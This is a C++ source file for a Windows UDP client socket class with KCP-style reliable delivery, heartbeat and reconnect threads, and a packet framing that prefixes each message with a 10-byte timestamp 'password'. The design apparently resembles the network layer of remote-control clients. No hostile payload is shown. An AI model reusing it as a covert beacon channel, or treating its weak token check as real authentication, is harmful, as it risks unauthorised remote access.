

#include "stdafx.h"
#include "UdpSocket.h"
#include "WaitFor.h"

//#ifdef _UDP_SUPPORT

static const BYTE s_szUdpCloseNotify[] = { 0xBE, 0xB6, 0x1F, 0xEB, 0xDA, 0x52, 0x46, 0xBA, 0x92, 0x33, 0x59, 0xDB, 0xBF, 0xE6, 0xC8, 0xE4 };
static const int s_iUdpCloseNotifySize = 16;
const CInitSocket CUdpSocket::sm_wsSocket;

BOOL CUdpSocket::Start(LPCTSTR lpszRemoteAddress, USHORT usPort, LPCTSTR lpszBindAddress, USHORT usLocalPort)
{
	DWORD dwMaxDatagramSize = 1432;

	if (m_dwMtu == 0)
		m_arqAttr.dwMtu = dwMaxDatagramSize;
	else
	{
		if (m_dwMtu > dwMaxDatagramSize)
			return FALSE;

		m_arqAttr.dwMtu = m_dwMtu;
	}


	m_enState = SS_STARTING;

	PrepareStart();
	m_ccContext.Reset();

	BOOL isOK = FALSE;

	HP_SOCKADDR addrRemote;
	static volatile CONNID s_dwConnID = 0;
	m_dwConnID = ::InterlockedIncrement(&s_dwConnID);
	if (m_dwConnID == 0)
		m_dwConnID = ::InterlockedIncrement(&s_dwConnID);
	int size = MAX_SEND_BUFFER;
	setsockopt(m_soClient, SOL_SOCKET, SO_SNDBUF, (CHAR*)&size, sizeof(int));
	size = MAX_RECV_BUFFER;
	setsockopt(m_soClient, SOL_SOCKET, SO_RCVBUF, (CHAR*)&size, sizeof(int));
	if (ConnectToServer(lpszRemoteAddress, usPort))
	{
		m_hWorker = (HANDLE)_beginthreadex(nullptr, 0, WorkerThreadProc, (LPVOID)this, 0, &m_dwWorkerID);
		if (m_hWorker)
		{
			isOK = TRUE;
			m_evWait.Reset();
		}
		else
			SetLastError(SE_WORKER_THREAD_CREATE, __FUNCTION__, ERROR_CREATE_FAILED);
	}
	else
		SetLastError(SE_CONNECT_SERVER, __FUNCTION__, ::WSAGetLastError());


	if (!isOK)
	{
		m_ccContext.Reset(FALSE);
		int __le_ = ::GetLastError(); 
		Stop();
		::SetLastError(__le_); 

	}
	return isOK;
}


void CUdpSocket::PrepareStart()
{
	m_hTimer = ::CreateWaitableTimer(nullptr, FALSE, nullptr);
	m_itPool.SetItemCapacity((int)1432);
	m_itPool.SetPoolSize((int)m_dwFreeBufferPoolSize);
	m_itPool.SetPoolHold((int)m_dwFreeBufferPoolHold);
	m_itPool.Prepare();
}


BOOL CUdpSocket::CheckStoping(DWORD dwCurrentThreadID)
{
	if (m_enState != SS_STOPPED)
	{
		CSpinLock locallock(m_csState);

		if (HasStarted())
		{
			m_enState = SS_STOPPING;
			return TRUE;
		}
	}

	SetLastError(SE_ILLEGAL_STATE, __FUNCTION__, ERROR_INVALID_STATE);

	return FALSE;
}


BOOL CUdpSocket::ConnectToServer(LPCTSTR lpszRemoteAddress, USHORT usPort)
{

	BOOL isOK = FALSE;
	m_soClient = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	if (m_soClient == INVALID_SOCKET)
		return FALSE;
	BOOL bNewBehavior = FALSE;	DWORD dwBytes;
	::WSAIoctl(m_soClient, SIO_UDP_CONNRESET, (LPVOID)&bNewBehavior, sizeof(bNewBehavior), nullptr, 0, &dwBytes, nullptr, nullptr);
	setsockopt(m_soClient, SOL_SOCKET, SO_EXCLUSIVEADDRUSE, (CHAR*)&bNewBehavior, sizeof(BOOL));
	setsockopt(m_soClient, SOL_SOCKET, SO_REUSEADDR, (CHAR*)&bNewBehavior, sizeof(BOOL));

	m_evSocket = ::WSACreateEvent();
	ASSERT(m_evSocket != WSA_INVALID_EVENT);

	hostent* pHostent = NULL;
	int len = WideCharToMultiByte(CP_ACP, 0, lpszRemoteAddress, lstrlen(lpszRemoteAddress), NULL, 0, NULL, NULL);
	char* cstr = new char[len + 1];
	WideCharToMultiByte(CP_ACP, 0, lpszRemoteAddress, lstrlen(lpszRemoteAddress), cstr, len, NULL, NULL);
	cstr[len] = '\0';
	pHostent = gethostbyname(cstr);
	delete cstr;

	if (pHostent == NULL)
	{
		return false;
	}
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family = AF_INET;
	ClientAddr.sin_port = htons(usPort);
	ClientAddr.sin_addr = *((struct in_addr*)pHostent->h_addr);
		if (::WSAEventSelect(m_soClient, m_evSocket, FD_CONNECT | FD_CLOSE) != SOCKET_ERROR)
		{
			int rc = ::connect(m_soClient, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr));
			isOK = (rc == NO_ERROR || (rc == SOCKET_ERROR && ::WSAGetLastError() == WSAEWOULDBLOCK));
		}
	return isOK;
}



UINT WINAPI CUdpSocket::WorkerThreadProc(LPVOID pv)
{
	TRACE("---------------> Client Worker Thread 0x%08X started <---------------\n", (::GetCurrentThreadId()));

	CUdpSocket* pClient = (CUdpSocket*)pv;

	pClient->lpDueTime.QuadPart = -(pClient->m_arqAttr.dwFlushInterval * 10000LL);
	::SetWaitableTimer(pClient->m_hTimer, &pClient->lpDueTime, pClient->m_arqAttr.dwFlushInterval, nullptr, nullptr, FALSE);

	BOOL bCallStop = TRUE;
	DWORD dwSize = 4;
	DWORD dwIndex = 0;

	HANDLE hUserEvt = pClient->m_hTimer;
	if (hUserEvt != nullptr) ++dwSize;

	HANDLE* hEvents = (HANDLE*)alloca(sizeof(HANDLE) * (dwSize));

	hEvents[dwIndex++] = pClient->m_evSocket;
	hEvents[dwIndex++] = pClient->m_evBuffer;
	hEvents[dwIndex++] = pClient->m_evWorker;
	hEvents[dwIndex++] = pClient->m_evUnpause;

	if (hUserEvt != nullptr)
		hEvents[dwIndex] = hUserEvt;

	while (pClient->HasStarted())
	{
		DWORD retval = ::WSAWaitForMultipleEvents(dwSize, hEvents, FALSE, WSA_INFINITE, FALSE);

		if (retval == WSA_WAIT_EVENT_0)
		{
			if (!pClient->ProcessNetworkEvent())
				break;
		}
		else if (retval == WSA_WAIT_EVENT_0 + 1)
		{
			if (!pClient->SendData())
				break;
		}
		else if (retval == WSA_WAIT_EVENT_0 + 2)
		{
			bCallStop = FALSE;
			break;
		}
		else if (retval == WSA_WAIT_EVENT_0 + 3)
		{
			if (!pClient->ReadData())
				break;
		}
		else if (retval == WSA_WAIT_EVENT_0 + 4)
		{
			if (!pClient->m_arqSession.Check())
			{
				pClient->m_ccContext.Reset(TRUE, SO_CLOSE, ENSURE_ERROR(ERROR_CANCELLED));
				break;
			}
		}

		else if (retval == WSA_WAIT_FAILED)
		{
			pClient->m_ccContext.Reset(TRUE, SO_UNKNOWN, ::WSAGetLastError());
			break;
		}
		else
			ENSURE(FALSE);
	}


	if (bCallStop && pClient->HasStarted())
		pClient->Stop();

	TRACE("---------------> Client Worker Thread 0x%08X stoped <---------------\n", (::GetCurrentThreadId()));

	return 0;
}


int CUdpSocket::DetectConnection()
{
	int result = NO_ERROR;

	if (send(m_soClient, nullptr, 0, 0) == SOCKET_ERROR)
	{
		result = ::WSAGetLastError();
		if (result == WSAEWOULDBLOCK)
			result = NO_ERROR;
	}

	TRACE("<C-CNNID: %Iu> send 0 bytes (detect package)\n", m_dwConnID);

	return result;
}

BOOL CUdpSocket::ProcessNetworkEvent()
{
	BOOL bContinue = TRUE;
	WSANETWORKEVENTS events;

	int rc = ::WSAEnumNetworkEvents(m_soClient, m_evSocket, &events);

	if (rc == SOCKET_ERROR)
		bContinue = HandleError(events);

	if (!IsConnected() && bContinue && events.lNetworkEvents & FD_CONNECT)
		bContinue = HandleConnect(events);

	if (bContinue && events.lNetworkEvents & FD_READ)
		bContinue = HandleRead(events);

	if (bContinue && events.lNetworkEvents & FD_WRITE)
		bContinue = HandleWrite(events);

	if (bContinue && events.lNetworkEvents & FD_CLOSE)
		bContinue = HandleClose(events);

	return bContinue;
}

BOOL CUdpSocket::HandleError(WSANETWORKEVENTS& events)
{
	int iCode = ::WSAGetLastError();
	EnSocketOperation enOperation = SO_UNKNOWN;

	if (events.lNetworkEvents & FD_CONNECT)
		enOperation = SO_CONNECT;
	else if (events.lNetworkEvents & FD_CLOSE)
		enOperation = SO_CLOSE;
	else if (events.lNetworkEvents & FD_READ)
		enOperation = SO_RECEIVE;
	else if (events.lNetworkEvents & FD_WRITE)
		enOperation = SO_SEND;

	ENSURE(::WSAResetEvent(m_evSocket));
	m_ccContext.Reset(TRUE, enOperation, iCode);

	return FALSE;
}

BOOL CUdpSocket::HandleRead(WSANETWORKEVENTS& events)
{
	BOOL bContinue = TRUE;
	int iCode = events.iErrorCode[FD_READ_BIT];

	if (iCode == 0)
		bContinue = ReadData();
	else
	{
		m_ccContext.Reset(TRUE, SO_RECEIVE, iCode);
		bContinue = FALSE;
	}

	return bContinue;
}

BOOL CUdpSocket::HandleWrite(WSANETWORKEVENTS& events)
{
	BOOL bContinue = TRUE;
	int iCode = events.iErrorCode[FD_WRITE_BIT];

	if (iCode == 0)
		bContinue = SendData();
	else
	{
		m_ccContext.Reset(TRUE, SO_SEND, iCode);
		bContinue = FALSE;
	}

	return bContinue;
}

BOOL CUdpSocket::HandleConnect(WSANETWORKEVENTS& events)
{
	int iCode = events.iErrorCode[FD_CONNECT_BIT];

	if (iCode != 0)
	{
		m_ccContext.Reset(TRUE, SO_CONNECT, iCode);
		return FALSE;
	}

	if (::WSAEventSelect(m_soClient, m_evSocket, FD_READ | FD_WRITE | FD_CLOSE) == SOCKET_ERROR)
	{
		m_ccContext.Reset(TRUE, SO_CONNECT, ::WSAGetLastError());
		return FALSE;
	}

	SetConnected();
	m_arqSession.Renew(this, this, m_arqAttr);
	ENSURE(DetectConnection() == NO_ERROR);

	return TRUE;
}

BOOL CUdpSocket::HandleClose(WSANETWORKEVENTS& events)
{
	int iCode = events.iErrorCode[FD_CLOSE_BIT];

	if (iCode == 0)
		m_ccContext.Reset(TRUE, SO_CLOSE, SE_OK);
	else
		m_ccContext.Reset(TRUE, SO_CLOSE, iCode);

	return FALSE;
}

BOOL CUdpSocket::ReadData()
{
	while (TRUE)
	{
		int rc = recv(m_soClient, (char*)(BYTE*)m_rcBuffer, 1432, 0);

		if (rc > 0)
		{
			if (rc == s_iUdpCloseNotifySize && memcmp(m_rcBuffer, s_szUdpCloseNotify, s_iUdpCloseNotifySize) == 0)
			{
				m_ccContext.Reset(TRUE, SO_CLOSE, NO_ERROR, FALSE);
				return FALSE;
			}

			if (TRIGGER(m_arqSession.Receive(m_rcBuffer, rc, m_arqBuffer, m_arqAttr.dwMaxMessageSize)) == HR_ERROR)
			{
				TRACE("<C-CNNID: %Iu> OnReceive() event return 'HR_ERROR', connection will be closed !\n", m_dwConnID);
				m_ccContext.Reset(TRUE, SO_RECEIVE, ENSURE_ERROR(ERROR_CANCELLED));
				return FALSE;
			}
		}
		else if (rc == SOCKET_ERROR)
		{
			int code = ::WSAGetLastError();

			if (code == WSAEWOULDBLOCK)
				break;
			else if (((code) == WSAENETRESET || (code) == WSAECONNRESET))
				continue;
			else
			{
				m_ccContext.Reset(TRUE, SO_RECEIVE, code);
				return FALSE;
			}
		}
		else if (rc == 0)
		{
		}
		else
			ASSERT(FALSE);
	}

	return TRUE;
}


BOOL CUdpSocket::SendData()
{
	while (TRUE)
	{
		TItemPtr itPtr(m_itPool, GetSendBuffer());
		if (itPtr.IsValid())
		{
			ASSERT(!itPtr->IsEmpty());
			int rc = send(m_soClient, (char*)itPtr->Ptr(), itPtr->Size(), 0);

			if (rc > 0)
			{
				ASSERT(rc == itPtr->Size());
				{
					CCriSecLock locallock(m_csSend);
					m_iPending -= rc;
				}
			}
			else if (rc == SOCKET_ERROR)
			{
				int iCode = ::WSAGetLastError();

				if (iCode == WSAEWOULDBLOCK)
				{
					CCriSecLock locallock(m_csSend);
					m_lsSend.PushFront(itPtr.Detach());
					break;
				}
				else
				{
					m_ccContext.Reset(TRUE, SO_SEND, iCode);
					return FALSE;
				}
			}
			else
				ASSERT(FALSE);
		}
		else
			break;
	}

	return TRUE;
}

TItem* CUdpSocket::GetSendBuffer()
{
	TItem* pItem = nullptr;

	if (m_iPending > 0)
	{
		CCriSecLock locallock(m_csSend);
		pItem = m_lsSend.PopFront();
	}

	return pItem;
}

BOOL CUdpSocket::Stop()
{
	DWORD dwCurrentThreadID = (::GetCurrentThreadId());

	if (!CheckStoping(dwCurrentThreadID))
		return FALSE;

	WaitForWorkerThreadEnd(dwCurrentThreadID);

	CheckConnected();

	if (m_ccContext.bFireOnClose)
		OnClose(this, this->m_dwConnID, m_ccContext.enOperation, m_ccContext.iErrorCode);


	if (m_evSocket != nullptr)
	{
		::WSACloseEvent(m_evSocket);
		m_evSocket = nullptr;
	}

	if (m_soClient != INVALID_SOCKET)
	{
		shutdown(m_soClient, SD_SEND);
		closesocket(m_soClient);
		m_soClient = INVALID_SOCKET;
	}

	Reset();

	return TRUE;
}

void CUdpSocket::Reset()
{
	m_arqSession.Reset();


	CCriSecLock locallock(m_csSend);

	m_evBuffer.Reset();
	m_evWorker.Reset();
	m_evUnpause.Reset();
	m_lsSend.Clear();
	m_itPool.Clear();

	m_strHost.Empty();

	m_usPort = 0;
	m_iPending = 0;
	m_enState = SS_STOPPED;

	m_evWait.Set();
}

void CUdpSocket::WaitForWorkerThreadEnd(DWORD dwCurrentThreadID)
{
	if (m_hWorker != nullptr)
	{
		if (dwCurrentThreadID != m_dwWorkerID)
		{
			m_evWorker.Set();
			ENSURE(::MsgWaitForSingleObject(m_hWorker));
		}

		::CloseHandle(m_hWorker);

		m_hWorker = nullptr;
		m_dwWorkerID = 0;
	}
}

void CUdpSocket::CheckConnected()
{
	if (!IsConnected())
		return;

	if (m_ccContext.bNotify)
		send(m_soClient, (LPCSTR)s_szUdpCloseNotify, s_iUdpCloseNotifySize, 0);


	SetConnected(FALSE);
}

int CUdpSocket::SendInternal(TItemPtr& itPtr)
{
	int iPending;

	{
		CCriSecLock locallock(m_csSend);

		if (!IsConnected())
			return ERROR_INVALID_STATE;

		iPending = m_iPending;
		m_iPending += itPtr->Size();

		m_lsSend.PushBack(itPtr.Detach());
	}

	if (iPending == 0 && m_iPending > 0) m_evBuffer.Set();

	return NO_ERROR;
}

void CUdpSocket::SetLastError(EnSocketError code, LPCSTR func, int ec)
{
	TRACE("%s --> Error: %d, EC: %d\n", func, code, ec);

	m_enLastError = code;
	::SetLastError(ec);
}



BOOL CUdpSocket::DoSend(CUdpSocket* pSender, const BYTE* pBuffer, int iLength)
{
	ASSERT(pBuffer && iLength > 0 && iLength <= (int)1432);

	int result = NO_ERROR;

	if (pBuffer && iLength > 0 && iLength <= (int)1432)
	{
		if (IsConnected())
		{
			TItemPtr itPtr(m_itPool, m_itPool.PickFreeItem());
			itPtr->Cat(pBuffer, iLength);

			result = SendInternal(itPtr);
		}
		else
			result = ERROR_INVALID_STATE;
	}
	else
		result = ERROR_INVALID_PARAMETER;

	if (result != NO_ERROR)
		::SetLastError(result);

	return (result == NO_ERROR);
}


BOOL CUdpSocket::ArqSend(const BYTE* pBuffer, int iLength, int iOffset)
{
	ASSERT(pBuffer && iLength > 0 && iLength <= (int)m_arqAttr.dwMaxMessageSize);

	int result = NO_ERROR;

	if (pBuffer && iLength > 0 && iLength <= (int)m_arqAttr.dwMaxMessageSize)
	{
		if (IsConnected())
		{
			if (iOffset != 0) pBuffer += iOffset;
			result = m_arqSession.Send(pBuffer, iLength);
		}
		else
			result = ERROR_INVALID_STATE;
	}
	else
		result = ERROR_INVALID_PARAMETER;

	if (result != NO_ERROR)
		::SetLastError(result);

	return (result == NO_ERROR);
}


int CUdpSocket::ArqOutputProc(const char* pBuffer, int iLength, IKCPCB* kcp, LPVOID pv)
{
	CUdpSocket* pClient = (CUdpSocket*)pv;
	BOOL isOK = NO_ERROR;
	ASSERT(pBuffer && iLength > 0 && iLength <= (int)1432);
	if (pBuffer && iLength > 0 && iLength <= (int)1432)
	{
		if (pClient->IsConnected())
		{
			TItemPtr itPtr(pClient->m_itPool, pClient->m_itPool.PickFreeItem());
			itPtr->Cat((BYTE*)pBuffer, iLength);

			isOK = pClient->SendInternal(itPtr);
		}
		else
			isOK = ERROR_INVALID_STATE;
	}
	else
		isOK = ERROR_INVALID_PARAMETER;
	if (isOK != NO_ERROR)
		::SetLastError(isOK);
	return isOK ? NO_ERROR : ::WSAGetLastError();
}

void CUdpSocket::Disconnect()
{
	Trace("%s\n", __FUNCTION__);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
}


bool CUdpSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	Trace("%s\n", __FUNCTION__);
	ResetEvent(m_hEvent);
	ResetEvent(m_hEvent_run);
	activetime = timeGetTime();
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
	ZeroMemory(m_password, 10);
	memcpy(m_password, &activetime, 8);
	m_password[8] = TOKEN_ACTIVED;
#ifdef _WIN64
	m_password[9] = 1;
#else
	m_password[9] = 0;
#endif
	if (m_enState != SS_STOPPED)
		Stop();
	BOOL ret = Start(lpszHost, nPort);
	DWORD dw = WaitForSingleObject(m_hEvent_run, 6000);

	switch (dw)
	{
	case WAIT_OBJECT_0:
		InterlockedExchange((LPLONG)&m_bIsRunning, TRUE);
		ResetEvent(m_hEvent_run);

		UINT  nThreadID;
		m_hThreadHeartWorker = (HANDLE)_beginthreadex(NULL,0,ThreadHeartbeat,(void*)this,0,&nThreadID);
		return true;

	case WAIT_TIMEOUT:
		ResetEvent(m_hEvent_run);
		return false;
		break;

	case WAIT_FAILED:
		ResetEvent(m_hEvent_run);
		return false;
		break;
	default:
		return false;
	}
	return false;
}

unsigned CUdpSocket::ThreadHeartbeat(LPVOID thisContext)
{
	// Get back our pointer to the class
	CUdpSocket* pThis = reinterpret_cast<CUdpSocket*>(thisContext);
	ASSERT(pThis);
	BYTE Token = TOKEN_HEARTBEAT;
	while (pThis->m_bIsRunning)
	{
		for (int i = 0; i < 100 && pThis->m_bIsRunning; i++)
			Sleep(100);
		if (pThis->m_bIsRunning) 	pThis->Send(&Token, 1);
		if (timeGetTime() - pThis->activetime > 30000)
		{
			if (pThis->m_enState != SS_STOPPED)
				pThis->Stop();
		}
	}
	return 0;
}

int CUdpSocket::Send(LPBYTE lpData, UINT nSize)
{
	m_clcs.lock();
	Trace("%s\n", __FUNCTION__);
	LONG nBufLen = nSize + 14;
	m_WriteBuffer.Write((PBYTE)&nBufLen, 4);					//总数据长度
	m_WriteBuffer.Write((PBYTE)m_password, 10);								//通信密码
	m_WriteBuffer.Write(lpData, nSize, 1, m_password);						//数据
	SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), 4000);
	m_WriteBuffer.ClearBuffer();
	m_clcs.unlock();
	return TRUE;
}

int CUdpSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int nRet = 0;
	int size = 0;
	int nSend = 0;
	UINT nSendRetry = 0;
	if (nSize >= nSplitSize)
	{
		UINT i = 0;
		nSendRetry = nSize / nSplitSize;
		for (i = 0; i < nSendRetry; i++)
		{
			ArqSend(lpData, nSplitSize);
			lpData += nSplitSize;
			nSend += nSplitSize;

		}
		if (nSize - nSend < nSplitSize)
		{
			if (nSize - nSend > 0)
			{
				ArqSend(lpData, nSize - nSend);
			}
		}
	}
	else
	{
		ArqSend(lpData, nSize);
	}
	return  TRUE;

}

void CUdpSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
	WaitForSingleObject(m_hThreadHeartWorker, INFINITE);
	Sleep(600);
	if (m_enState != SS_STOPPED)
		Stop();
	CloseHandle(m_hEvent);
	CloseHandle(m_hEvent_run);
	m_pManager->bStop = TRUE;
	Sleep(300);
}

BOOL CUdpSocket::IsRunning()
{
	return m_bIsRunning;
}

EnHandleResult CUdpSocket::OnReceive(CUdpSocket* pSender, const BYTE* pData, int iLength)
{
	Trace("%s %d\n", __FUNCTION__, iLength);
	m_CompressionBuffer.Write((LPBYTE)pData, iLength);
	while ((int)(m_CompressionBuffer.GetBufferLen()) > 14)
	{
		if ((memcmp(m_password, m_CompressionBuffer.GetBuffer(4), 10) != 0))
		{
			TRACE("%s  memcmp  baddata \r\n", __FUNCTION__);
			m_CompressionBuffer.ClearBuffer();
			return HR_OK;
		}
		int nSize = 0;
		CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(0), sizeof(int));
		if (nSize && ((int)m_CompressionBuffer.GetBufferLen()) >= nSize)
		{
			if (((int)m_CompressionBuffer.GetBufferLen() < nSize))
			{
				TRACE("%s  memcmp  baddata \r\n", __FUNCTION__);
				m_CompressionBuffer.ClearBuffer();
				return HR_OK;
			}
			activetime = timeGetTime();
			m_DeCompressionBuffer.ClearBuffer();						//清理旧数据
			m_DeCompressionBuffer.Write(m_CompressionBuffer.GetBuffer(14), nSize - 14, 1, m_password);				//写入数据
			m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
			m_CompressionBuffer.Delete(nSize);
		}
		else
			break;
	}
	return HR_OK;
}

EnHandleResult CUdpSocket::OnHandShake(CUdpSocket* pSender, CONNID dwConnID)
{
	Trace("OnHandShake===%d\r\n", dwConnID);
	SetEvent(m_hEvent_run);
	InterlockedExchange((LPLONG)&m_bIsRunning, TRUE);
	return HR_OK;
}

EnHandleResult CUdpSocket::OnClose(CUdpSocket* pSender, CONNID dwConnID, EnSocketOperation enOperation, int iErrorCode)
{
	Trace("OnClose===%d\r\n", dwConnID);
	SetEvent(m_hEvent);
	InterlockedExchange((LPLONG)&m_bIsRunning, FALSE);
	return HR_OK;
}


void CUdpSocket::setManagerCallBack(CManager* pManager)
{
	m_pManager = pManager;
}
//#endif
